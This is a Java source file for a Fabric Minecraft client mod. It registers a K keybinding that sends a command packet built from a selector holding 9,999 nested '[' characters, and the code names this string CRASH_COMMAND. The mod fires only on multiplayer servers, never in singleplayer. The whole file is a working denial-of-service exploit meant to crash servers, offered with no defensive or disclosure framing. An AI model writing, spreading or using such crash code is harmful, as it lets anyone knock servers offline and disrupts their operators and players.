package com.lcs;

import net.fabricmc.api.ClientModInitializer;

import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
import net.minecraft.client.option.KeyBinding;
import net.minecraft.client.MinecraftClient;

import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;
import org.lwjgl.glfw.GLFW;

public class LongCommandSenderClient implements ClientModInitializer {
	private static final String MOD_ID = "sendlongcommand";
	private static final String CRASH_COMMAND =
			"w @a[nbt={a:" +
					"[".repeat(9999);

	private static KeyBinding keyBinding;

	@Override
	public void onInitializeClient() {
		keyBinding = KeyBindingHelper.registerKeyBinding(new KeyBinding(
				"key." + MOD_ID + ".crash",
				GLFW.GLFW_KEY_K,
				"key.categories.misc"
		));

		// Register client tick event to check key press
		net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents.END_CLIENT_TICK.register(client -> {
			while (keyBinding.wasPressed()) {
				sendLongCommand(client);
			}
		});
	}

	private void sendLongCommand(MinecraftClient client) {
		// Only send if player is in a world and not singleplayer
		if (client.player != null && client.getNetworkHandler() != null && !client.isInSingleplayer()) {
			Packet<?> packet = new CommandExecutionC2SPacket(CRASH_COMMAND);
			client.getNetworkHandler().sendPacket(packet);
		}
	}
}